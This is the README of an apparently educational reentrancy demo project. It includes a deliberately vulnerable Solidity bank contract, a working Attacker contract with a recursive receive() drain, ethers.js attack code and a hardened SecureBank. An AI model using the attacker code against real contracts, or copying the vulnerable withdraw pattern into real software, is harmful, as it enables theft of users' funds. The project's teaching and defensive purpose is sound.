# Interactive Reentrancy Attack Demo

A complete, self‑contained university cybersecurity project that lets you **deploy,
attack, and defend** a vulnerable Ethereum smart contract from a browser — live,
on a local blockchain, with no real funds and no real network.

Click a button to deploy contracts, seed innocent "victim" deposits, launch the
classic reentrancy attack, and watch Ether drain in real time. Flip a toggle to
the hardened contract and watch the identical attack revert.

> ⚠️ **Educational use only.** Everything runs on a throwaway local chain
> (`localhost:8545`). The vulnerable contract exists purely to be studied. Never
> deploy code like it to any real network.

---

## Table of contents

1. [Project overview and educational goals](#1-project-overview-and-educational-goals)
2. [Complete local setup instructions](#2-complete-local-setup-instructions)
3. [Smart contracts (vulnerable and secure)](#3-smart-contracts-vulnerable-and-secure)
4. [Frontend React structure and key files](#4-frontend-react-structure-and-key-files)
5. [Ethers.js integration](#5-ethersjs-integration)
6. [Step-by-step run instructions](#6-step-by-step-run-instructions)
7. [Detailed attack walkthrough](#7-detailed-attack-walkthrough)
8. [Mitigation section (the UI toggle)](#8-mitigation-section-the-ui-toggle)
9. [Bonus features](#9-bonus-features)
10. [Student report guidelines and ethical usage](#10-student-report-guidelines-and-ethical-usage)

---

## 1. Project overview and educational goals

**Reentrancy** is the vulnerability behind the 2016 DAO hack (~3.6M ETH). It
happens when a contract sends Ether to an external address *before* it updates
its own bookkeeping. The receiving contract can call back ("re‑enter") into the
victim function while the victim still believes the caller is owed money — and
drain the balance in a loop.

This project makes that abstract idea concrete and clickable.

**Learning objectives — after using this demo a student can:**

- Explain the reentrancy vulnerability and the **Checks‑Effects‑Interactions
  (CEI)** pattern in their own words.
- Read the vulnerable `withdraw()` and point to the exact line that creates the
  attack window.
- Describe how an attacker's `receive()` fallback turns one withdrawal into many.
- Apply two independent mitigations (CEI ordering + a `nonReentrant` mutex) and
  prove they work.
- Reason about *why* the secure version's transaction reverts entirely rather
  than partially succeeding.

**What you get:**

| Layer | Tech | Purpose |
|-------|------|---------|
| Contracts | Solidity 0.8.20 | `VulnerableBank`, `SecureBank`, `Attacker` |
| Chain | Hardhat local node (chainId 31337) | Instant, free, resettable blockchain |
| Tests | Hardhat + Chai | Machine‑proof the exploit and the fix |
| Frontend | React 18 + Vite | Professional dashboard |
| Web3 | ethers.js v6 | Deploy + transact straight from the browser |

---

## 2. Complete local setup instructions

### Prerequisites

- **Node.js 18+** (tested on Node 22) and npm.
- A modern browser. **MetaMask is optional** — a built‑in "Local dev wallet"
  mode lets the demo run with zero wallet configuration.

### Folder layout

```
reentrancy-demo/
├── contracts/            # Solidity: VulnerableBank, SecureBank, Attacker
├── scripts/
│   ├── deploy.js         # optional CLI deploy + seed
│   └── export-abis.js    # writes ABIs+bytecode into the frontend
├── test/
│   └── reentrancy.test.js
├── hardhat.config.js
├── package.json          # backend (Hardhat)
└── frontend/             # React + Vite dashboard
    ├── index.html
    ├── vite.config.js
    ├── package.json      # frontend deps (react, ethers)
    └── src/
        ├── main.jsx
        ├── App.jsx
        ├── index.css
        ├── constants.js
        ├── contracts.js  # AUTO-GENERATED ABIs + bytecode
        ├── hooks/useDemo.js
        └── components/*.jsx
```

### Install

Two npm projects — install both.

```bash
# 1) Backend (Hardhat + contracts)
cd reentrancy-demo
npm install

# 2) Compile contracts and export their ABIs/bytecode to the frontend
npm run build:contracts     # = hardhat compile + scripts/export-abis.js

# 3) Frontend (React + ethers)
cd frontend
npm install
```

> `frontend/src/contracts.js` ships pre‑generated, so the app works even before
> you compile. Re‑run `npm run build:contracts` from `reentrancy-demo/` any time
> you change a contract.

### Environment variables (optional)

The demo needs **no secrets**. Two overrides exist if you want them — copy
`frontend/.env.example` to `frontend/.env`:

```bash
VITE_RPC_URL=http://127.0.0.1:8545       # local Hardhat RPC
VITE_LOCAL_PRIVATE_KEY=0xac0974bec...     # Hardhat account #0 (public throwaway key)
```

`VITE_LOCAL_PRIVATE_KEY` is one of Hardhat's well‑known development keys — printed
by `hardhat node` on every start, worthless on any real network, safe to commit.

---

## 3. Smart contracts (vulnerable and secure)

All three contracts target **Solidity 0.8.20**. Full source lives in
`contracts/`; reproduced here for study.

### 3.1 `VulnerableBank.sol` — the bug

The single defect: the external `call` happens **before** `balances[msg.sender]`
is zeroed.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract VulnerableBank {
    mapping(address => uint256) public balances;

    event Deposit(address indexed account, uint256 amount);
    event Withdraw(address indexed account, uint256 amount);

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Nothing to withdraw");

        // ---- INTERACTION (happens too early) ----
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "Ether transfer failed");

        // ---- EFFECT (happens too late) ----
        balances[msg.sender] = 0;

        emit Withdraw(msg.sender, bal);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    function totalBankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### 3.2 `SecureBank.sol` — the fix

Same interface, two independent defenses: **CEI ordering** (zero the balance
before sending) and a **`nonReentrant` mutex**.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SecureBank {
    mapping(address => uint256) public balances;
    uint256 private _status = 1; // 1 = unlocked, 2 = locked

    event Deposit(address indexed account, uint256 amount);
    event Withdraw(address indexed account, uint256 amount);

    modifier nonReentrant() {
        require(_status == 1, "ReentrancyGuard: reentrant call");
        _status = 2;
        _;
        _status = 1;
    }

    function deposit() external payable {
        require(msg.value > 0, "Deposit must be greater than 0");
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external nonReentrant {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "Nothing to withdraw");

        balances[msg.sender] = 0;                 // EFFECT first

        (bool ok, ) = msg.sender.call{value: bal}(""); // INTERACTION last
        require(ok, "Ether transfer failed");

        emit Withdraw(msg.sender, bal);
    }

    function getBalance() external view returns (uint256) {
        return balances[msg.sender];
    }

    function totalBankBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

> In production you would inherit OpenZeppelin's `ReentrancyGuard` instead of the
> inline mutex. The inline version is used here so the project has **zero external
> contract dependencies** and every line is visible for study.

### 3.3 `Attacker.sol` — the exploit

Points at any bank implementing `deposit()/withdraw()`. Its `receive()` fallback
is the recursion engine.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IBank public immutable bank;
    address public immutable owner;
    uint256 public unit;          // amount pulled per withdraw (the seed)
    uint256 public reentryCount;  // recursive re-entries performed

    event AttackStarted(uint256 seed);
    event Reentered(uint256 depth, uint256 bankBalanceRemaining);
    event AttackFinished(uint256 totalReentries, uint256 stolen);

    constructor(address bankAddress) {
        bank = IBank(bankAddress);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value > 0, "Send seed Ether to attack");
        unit = msg.value;
        reentryCount = 0;
        emit AttackStarted(msg.value);

        bank.deposit{value: msg.value}();
        bank.withdraw();

        emit AttackFinished(reentryCount, address(this).balance);
    }

    receive() external payable {
        if (address(bank).balance >= unit) {
            reentryCount += 1;
            emit Reentered(reentryCount, address(bank).balance);
            bank.withdraw();
        }
    }

    function collect() external {
        require(msg.sender == owner, "Not owner");
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "Collect failed");
    }

    function stolenBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

### Prove it with the test suite

```bash
cd reentrancy-demo
npm test
```

```
  Reentrancy attack
    ✔ drains the VulnerableBank
    ✔ cannot drain the SecureBank (attack reverts)
    ✔ lets the attacker collect stolen funds to their wallet

  3 passing
```

---

## 4. Frontend React structure and key files

Vite + React 18. All blockchain logic lives in **one hook** (`useDemo`); the
components are thin and presentational.

```
src/
├── main.jsx                    # React root
├── App.jsx                     # layout + wiring; owns the useDemo() hook
├── constants.js                # RPC URL, chainId, Hardhat dev keys, defaults
├── contracts.js                # AUTO-GENERATED ABIs + bytecode (from Hardhat)
├── hooks/
│   └── useDemo.js              # ← all ethers.js logic: connect/deploy/attack
└── components/
    ├── ConnectPanel.jsx        # choose MetaMask or Local dev wallet
    ├── DeployPanel.jsx         # deploy contracts + seed victims + reset
    ├── TargetToggle.jsx        # Vulnerable ⇄ Secure (the mitigation switch)
    ├── InteractionPanel.jsx    # honest deposit / withdraw
    ├── AttackPanel.jsx         # launch attack + collect loot + verdict
    ├── BalancesPanel.jsx       # live balance bars for banks + accounts
    ├── StatsPanel.jsx          # re-entries / drained / stolen tiles
    ├── FlowDiagram.jsx         # visual explanation of the attack loop
    ├── TxHistoryTable.jsx      # transaction history table
    └── TransactionLog.jsx      # streaming event log
```

**Data flow:** `App` calls `useDemo()` once and passes the returned object to
every panel. The hook keeps live ethers objects (providers, signer, contract
addresses) in a `useRef` so async callbacks never read stale values, and mirrors
everything the UI renders into React state. A 4‑second interval refreshes live
balances.

`App.jsx` (abridged):

```jsx
export default function App() {
  const demo = useDemo();                 // single source of truth
  const connected = Boolean(demo.mode);
  return !connected ? (
    <ConnectPanel demo={demo} />
  ) : (
    <main className="grid">
      <section className="col">
        <DeployPanel demo={demo} />
        <TargetToggle demo={demo} />
        <InteractionPanel demo={demo} />
        <AttackPanel demo={demo} />
      </section>
      <section className="col">
        <BalancesPanel demo={demo} />
        <StatsPanel demo={demo} />
        <FlowDiagram demo={demo} />
        <TxHistoryTable demo={demo} />
        <TransactionLog demo={demo} />
      </section>
    </main>
  );
}
```

---

## 5. Ethers.js integration

Everything is **ethers v6**. Key patterns from `src/hooks/useDemo.js`:

**Connecting (two modes).** MetaMask uses a `BrowserProvider`; the zero‑config
mode uses a `Wallet` built from a Hardhat dev key. Both read through a direct
`JsonRpcProvider` so balances are always fresh:

```js
// Local dev wallet — no MetaMask needed
const readProvider = new ethers.JsonRpcProvider(RPC_URL, undefined, {
  cacheTimeout: -1,                       // disable ethers' 250ms read cache
});
const signer = new ethers.Wallet(LOCAL_PRIVATE_KEY, readProvider);

// MetaMask
const browserProvider = new ethers.BrowserProvider(window.ethereum);
await browserProvider.send("eth_requestAccounts", []);
const signer = await browserProvider.getSigner();
```

> **Gotcha we hit and fixed:** ethers v6 caches `getBalance`/`call` results for
> 250 ms. On a fast local chain the "before" and "after" reads around an attack
> collide and the drained amount shows as 0. Passing `{ cacheTimeout: -1 }` to
> the `JsonRpcProvider` disables the cache so live balances are always correct.

**Deploying from the browser** (using the exported bytecode):

```js
const factory = new ethers.ContractFactory(
  CONTRACTS.VulnerableBank.abi,
  CONTRACTS.VulnerableBank.bytecode,
  signer
);
const bank = await factory.deploy();
await bank.waitForDeployment();
const address = await bank.getAddress();
```

**Depositing / withdrawing:**

```js
const bank = new ethers.Contract(address, CONTRACTS.VulnerableBank.abi, signer);
await (await bank.deposit({ value: ethers.parseEther("1") })).wait();
await (await bank.withdraw()).wait();
```

**Executing the attack** — deploy a fresh `Attacker` pointed at the selected
bank, fire it, then replay `Reentered` events from the receipt to narrate the
drain live:

```js
const af = new ethers.ContractFactory(
  CONTRACTS.Attacker.abi, CONTRACTS.Attacker.bytecode, signer
);
const attacker = await af.deploy(targetBankAddress);
await attacker.waitForDeployment();

const tx = await attacker.attack({ value: ethers.parseEther(seed) });
const receipt = await tx.wait();               // reverts against SecureBank

for (const log of receipt.logs) {
  try {
    const parsed = attacker.interface.parseLog(log);
    if (parsed?.name === "Reentered") {
      appendLog(`re-entry #${parsed.args.depth} — bank holds ` +
                `${ethers.formatEther(parsed.args.bankBalanceRemaining)} ETH`);
    }
  } catch { /* not an attacker event */ }
}
```

Against `SecureBank`, `tx.wait()` throws with
`execution reverted: "Ether transfer failed"`; the UI catches it and shows the
**"Attack blocked"** verdict.

---

## 6. Step-by-step run instructions

You need **two terminals**.

**Terminal 1 — start the local blockchain:**

```bash
cd reentrancy-demo
npm run chain          # = hardhat node, serves http://127.0.0.1:8545
```

Leave it running. It prints 20 funded test accounts (10000 ETH each).

**Terminal 2 — start the dashboard:**

```bash
cd reentrancy-demo/frontend
npm run dev            # Vite dev server, http://localhost:5173
```

Open **http://localhost:5173** and:

1. Click **Local dev wallet** (instant) — or **MetaMask** (it will offer to add
   the Hardhat network automatically).
2. **Deploy contracts** → **Seed 2 victims**.
3. Leave the target on **Vulnerable** and click **Launch reentrancy attack**.
4. Flip the toggle to **Secure** and attack again — watch it get blocked.

**Using MetaMask instead of the local wallet?** Add a network manually if the
auto‑prompt doesn't appear: RPC URL `http://127.0.0.1:8545`, Chain ID `31337`,
Currency `ETH`. Import a Hardhat account with one of the private keys printed by
`npm run chain` to have spendable test ETH.

---

## 7. Detailed attack walkthrough

What you see on screen, step by step (matches the panels in the dashboard):

1. **Connect.** The top‑right badge turns green and shows your address and
   `chain 31337`.

2. **Deploy & seed.** After *Deploy contracts*, panel 1 lists three addresses
   (`VulnerableBank`, `SecureBank`, `Attacker`). After *Seed 2 victims*, the
   **Live balances** bars show `VulnerableBank 10 ETH` and `SecureBank 10 ETH`
   (two victims × 5 ETH each), plus victim wallet balances.

3. **Launch attack (Vulnerable).** In real time you see:
   - The **event log** stream: `Attacker deployed → 0x… targeting the vulnerable
     bank`, then `Launching attack with 1 ETH seed…`, then a cascade of
     `↳ re-entry #1 … #10 — bank still holds N ETH` lines counting *down* as the
     bank empties.
   - The **VulnerableBank** balance bar collapse from 10 ETH to **0 ETH**.
   - The **Attacker** balance bar shoot up to **11 ETH** (the 10 stolen + its own
     1 ETH seed returned).
   - **Attack statistics** fill in: `10` recursive re‑entries · `10.00` ETH
     drained · `11.00` ETH held by attacker.
   - A red verdict banner: **"💀 Attack succeeded — 10.00 ETH drained."**
   - A **Collect … ETH loot → wallet** button appears; clicking it sweeps the
     stolen Ether to your EOA.

4. **Transaction history** logs every step with `SUCCESS`/`REVERT` chips; the
   **event log** keeps the full narrative.

> A rendered screenshot of this exact end state (vulnerable drained to 0, secure
> intact at 10, attacker holding 11, 10 re‑entries) is what the dashboard
> produces after running both attacks in sequence.

---

## 8. Mitigation section (the UI toggle)

Panel 2, **Choose the target**, is the mitigation switch:

- **Vulnerable** → the attack drains the bank (section 7).
- **Secure** → the *identical* attacker, same seed, same clicks — **reverts**.

**Why it reverts.** When the attacker re‑enters `SecureBank.withdraw()`:

- the **`nonReentrant` mutex** is already locked (`_status == 2`) → the
  `require` fails, **and**
- even without the mutex, **CEI ordering** already set `balances[attacker] = 0`,
  so the re‑entrant call would hit `require(bal > 0, "Nothing to withdraw")`.

The nested revert bubbles up: the bank's low‑level `call` returns `false`,
`require(ok, "Ether transfer failed")` fires, and the **entire transaction
unwinds** — no partial theft, no state change. The UI shows a green **"🛡️ Attack
blocked"** verdict and the `SecureBank` balance stays at 10 ETH.

The **flow diagram** panel reacts to the toggle too: the loop edge is drawn red
and "open" for Vulnerable, green and "blocked" for Secure.

---

## 9. Bonus features

- **Transaction history table** — timestamped rows for every deploy, deposit,
  attack, and collect, each tagged `SUCCESS` or `REVERT`.
- **Visual flow diagram** — `Attacker.attack()` → `Bank.withdraw()` →
  `Attacker.receive()` → loop, with a numbered plain‑English explanation that
  changes based on the selected target.
- **Attack statistics** — number of recursive calls, ETH drained from the bank,
  and ETH currently held by the attacker, read from on‑chain state and events.
- **Live balance bars** — auto‑refresh every 4 s and after every action.
- **Streaming event log** — colour‑coded, includes the per‑depth re‑entry
  narration parsed from `Reentered` events.
- **Two wallet modes** — zero‑config Local dev wallet *and* MetaMask.
- **One‑click Reset** — wipe the dashboard and redeploy fresh contracts.
- **Loot collection** — `collect()` sweeps stolen Ether to the attacker's EOA.

---

## 10. Student report guidelines and ethical usage

### Suggested report structure

1. **Introduction** — what reentrancy is; a sentence on the DAO hack.
2. **Vulnerability analysis** — quote `VulnerableBank.withdraw()` and identify
   the exact line that violates Checks‑Effects‑Interactions.
3. **Exploit design** — explain how `Attacker.receive()` produces recursion; a
   sequence diagram of the call stack is ideal.
4. **Demonstration** — screenshots of the dashboard before/after the attack, the
   statistics tiles, and the event log showing the re‑entry cascade.
5. **Mitigation** — show the `SecureBank` diff (CEI + `nonReentrant`), then the
   screenshot of the blocked attack. Explain *why* the whole transaction reverts.
6. **Evaluation** — compare defenses (CEI vs. mutex vs. pull‑payments); mention
   OpenZeppelin `ReentrancyGuard`; discuss gas and trade‑offs.
7. **Conclusion & references** — SWC‑107, Solidity docs on security
   considerations, the DAO post‑mortems.

**Evidence to capture:** the Hardhat `npm test` output (all 3 passing), the
"before" and "after" dashboard screenshots, and the transaction history table.

### Discussion questions

- Why does `msg.sender.call{value: ...}("")` enable reentrancy when
  `transfer`/`send` historically did not? What changed that makes gas‑stipend
  reasoning unsafe today?
- Does CEI *alone* fully protect `SecureBank`? Does the mutex *alone*? Why keep
  both?
- How would a **cross‑function** or **read‑only** reentrancy attack differ from
  the single‑function case shown here?

### Ethical usage notes

- This code is for **authorized, educational use on a local test chain only.**
- The vulnerable contract is intentionally insecure. **Never deploy it, or code
  patterned on it, to a public/main network.**
- Do not use these techniques against any contract or system you do not own or
  lack **explicit written permission** to test. Unauthorized access to computer
  systems is illegal in most jurisdictions.
- Responsible disclosure: if you find a real reentrancy bug in a live protocol,
  report it privately to the maintainers or via a bug‑bounty program — do not
  exploit it.

---

### License

MIT — for educational use. See `SPDX-License-Identifier` headers in each contract.
